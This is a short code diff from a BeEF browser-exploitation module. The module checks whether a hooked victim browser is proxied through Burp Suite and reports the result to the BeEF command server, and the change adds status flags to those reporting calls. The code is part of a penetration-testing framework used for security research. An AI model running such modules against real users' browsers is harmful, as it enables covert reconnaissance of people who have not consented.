@@ -18,11 +18,10 @@ beef.execute(function() {
       var response = FindProxyForURL('', '');
       beef.debug("Response: " + response);
       beef.net.send("<%= @command_url %>", <%= @command_id %>,
-        "has_burp=true&response=" + response
-      );
+        "has_burp=true&response=" + response, beef.are.status_success());
     } catch(e) {
       beef.debug("Response: " + e.message);
-      beef.net.send("<%= @command_url %>", <%= @command_id %>, "has_burp=false");
+      beef.net.send("<%= @command_url %>", <%= @command_id %>, "has_burp=false", beef.are.status_error());
     }
   }
 
